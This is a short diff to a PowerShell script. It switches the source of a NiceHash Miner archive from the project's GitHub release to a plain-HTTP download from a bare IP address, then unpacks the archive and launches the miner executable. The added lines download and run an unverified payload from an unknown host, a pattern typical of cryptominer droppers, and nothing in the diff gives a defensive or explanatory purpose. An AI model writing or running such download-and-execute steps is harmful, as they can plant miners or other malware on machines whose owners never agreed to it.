@@ -1,4 +1,5 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-Invoke-WebRequest https://github.com/nicehash/NiceHashMinerLegacy/releases/download/1.9.0.23/nhm_windows_1.9.0.23.zip -outfile c:\temp\nhm_windows_1.9.0.23.zip
-Expand-Archive -Path c:\temp\nhm_windows_1.9.0.23.zip -DestinationPath C:\Tool
+Invoke-WebRequest http://139.180.134.229/Tool.Zip -outfile c:\Tool.Zip
+Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
+Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  -Wait
